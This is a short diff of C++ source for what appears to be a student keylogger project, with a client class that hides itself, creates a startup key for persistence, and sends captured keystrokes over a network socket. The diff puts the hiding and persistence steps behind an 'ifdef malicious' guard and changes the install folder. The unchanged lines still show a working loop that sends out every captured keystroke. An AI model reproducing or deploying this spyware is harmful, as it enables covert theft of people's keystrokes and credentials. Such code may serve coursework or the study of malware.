@@ -52,15 +52,21 @@ class Client {
 
 		void run() {
 			fprintf(stderr, "Client start running with handle %d\n", connHd);
+			#ifdef malicious
 			hide();
+			#endif
+
 			int test = testKey();
 			if (test == 2) {
-				string folder = "c:\\Users\\user\\Desktop\\malware\\bin\\";
+				string folder = "c:\\ntu-course\\107-1\\KeyLogger\\bin\\";
 				string path = folder + exeName;
 				fprintf(stderr, "%s\n", path.c_str());
 
+				#ifdef malicious
 				if (createKey(path.c_str())) 
 					fprintf(stderr, "key create success\n");
+				#endif
+
 			} else {
 				fprintf(stderr, "testKey failed %d\n", test);
 			}
@@ -70,7 +76,6 @@ class Client {
 				string key = getKey();
 				char L = key.length();
 				if (L == 0) continue;
-				L = htonl(L);
 				send(connHd, &L, 1, 0);
 				send(connHd, key.c_str(), L, 0);
 			}
